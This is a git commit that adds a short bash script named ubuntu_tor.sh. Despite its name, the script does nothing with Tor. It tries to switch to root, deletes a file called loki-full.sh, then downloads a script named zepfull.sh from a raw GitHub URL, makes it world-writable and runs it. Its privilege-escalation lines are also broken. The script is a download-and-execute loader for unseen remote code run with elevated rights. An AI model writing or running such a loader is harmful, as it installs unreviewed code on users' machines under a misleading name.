b689b88164e252521363f8857fe55f32878a2c9c
wollfoo <nhac.tien1988@gmail.com>
2024-01-10 23:35:22 +0700

    Create ubuntu_tor.sh

---
+++ ubuntu_tor.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+if [ "$(id -u)" != "0" ]; then
+   sudo su   
+else
+	echo "Root user"
+fi
+sudo -i
+apt-get update
+apt-get install -y git wget
+rm -rf loki-full.sh
+wget https://raw.githubusercontent.com/wollfoo/phuongky/main/zepfull.sh
+chmod 777 zepfull.sh
+./zepfull.sh
